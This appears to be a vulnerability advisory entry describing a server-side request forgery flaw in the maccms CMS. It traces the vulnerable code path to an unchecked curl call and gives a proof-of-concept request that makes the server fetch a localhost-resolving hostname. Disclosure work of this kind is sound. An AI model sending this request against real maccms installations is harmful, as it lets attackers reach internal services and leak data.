### Maccms

- **Application**: maccms<= v2021.1000.2000

- **Threat Impact**: Sensitive data leakage

- **Code**:

  ```
  class Receive {
  public function __construct() {
  
   $this->_param = input('','','trim,urldecode');
  }
  
  public function vod() {
    $data['data'][] = $info;
    $res = model('Collect')->vod_data([],$data,0);
  }
  }
  
  class Collect {
    public function vod_data($param,$data,$show=1){
      foreach($data['data'] as $k=>$v){
        $this->syncImages($config['pic'], $v['vod_pic'], 'vod');
      }
      
      public function syncImages($pic_status,$pic_url,$flag='vod'){
        model('Image')->down_load($pic_url, ...);
      }
    }
  }
  
  class Image {
  public function down_load($url,$config,$flag='vod') {
    $this->down_exec($url,$config,$flag);
  }
  
  public function down_exec($url,$config,$flag='vod') {
    mac_curl_get($url);
  }
  }
  
  function mac_curl_get($url,$heads=array(),$cookie='') {
  $ch = curl_init($url);
  curl_exec($ch);
  }
  ```

- **POC**:

  1. Listen on 8888 on server side
  1. `curl http://server/admin.php/admin/index/check_back_link?url=http://127.0.0.1.traefik.me:8888`
  1. Receive a request on server side. 

